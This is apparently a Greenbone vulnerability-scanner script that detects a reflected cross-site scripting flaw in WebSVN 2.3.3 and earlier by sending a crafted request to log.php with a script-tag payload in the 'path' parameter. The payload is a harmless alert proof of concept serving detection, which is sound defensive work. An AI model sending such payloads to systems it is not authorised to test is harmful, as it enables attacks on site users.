# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:tigris:websvn";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806882");
  script_version("2023-10-27T05:05:28+0000");
  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2016-03-01 14:45:36 +0530 (Tue, 01 Mar 2016)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2016-12-03 03:25:00 +0000 (Sat, 03 Dec 2016)");

  script_cve_id("CVE-2016-2511", "CVE-2016-1236");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"Workaround");

  script_name("WebSVN <= 2.3.3 XSS Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_websvn_http_detect.nasl");
  script_mandatory_keys("websvn/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"WebSVN is prone to a cross-site scripting (XSS)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to improper validation of the 'path' parameter
  in 'log.php', 'revision.php', 'listing.php' and 'comp.php'.");

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to execute
  arbitrary script code in a user's browser session within the trust relationship between their
  browser and the server.");

  script_tag(name:"affected", value:"WebSVN version 2.3.3 and prior.");

  script_tag(name:"solution", value:"As a workaround make the changes in the file
  'include/setup.php' as mentioned in the advisory at the references.");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2016/Feb/99");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/135886");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + '/log.php?path=%00";><script>alert(document.domain)</script>';

req = http_get(item: url, port: port);
res = http_keepalive_send_recv(port: port, data: req);

if (res =~ "^HTTP/1\.[01] 200" && "WebSVN" >< res && "<script>alert(document.domain)</script>" >< res) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
